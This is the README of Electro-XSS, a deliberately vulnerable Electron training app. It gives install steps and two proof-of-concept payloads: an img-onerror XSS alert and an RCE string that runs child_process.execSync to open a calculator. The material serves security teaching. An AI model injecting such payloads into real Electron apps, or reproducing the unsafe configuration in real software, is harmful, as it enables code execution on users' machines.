# Electro-XSS
------------------------


Electro-XSS is a buggy desktop application developed with the Electron JS Framework. This application will assist you in grasping the electron apps' basic structure as well as the most common Dev misconfiguration. This app allows security professionals to simulate XSS and RCE attacks.

#### Requirements


* Install [nodejs & npm](https://nodejs.org/en/)

####  Installation


```bash
git clone https://github.com/MrH4r1/Electro-XSS.git
cd Electro-XSS
npm install
```

![alt text](https://github.com/MrH4r1/Electro-XSS/blob/main/Static/Electro-XSS-Install.gif?raw=true)


#### Running Electro-XSS

```bash
 npm run electro-xss
```

![alt text](https://github.com/MrH4r1/Electro-XSS/blob/main/Static/Electro-XSS-run.gif?raw=true)

#### XSS

```js
<img src=x onerror=alert(1) />
```

![alt text](https://github.com/MrH4r1/Electro-XSS/blob/main/Static/Electro-XSS.gif?raw=true)

#### RCE

```js
<img src=x onerror=alert(require('child_process').execSync('gnome-calculator')); />
```

![alt text](https://github.com/MrH4r1/Electro-XSS/blob/main/Static/Electro-XSS-RCE.gif?raw=true)
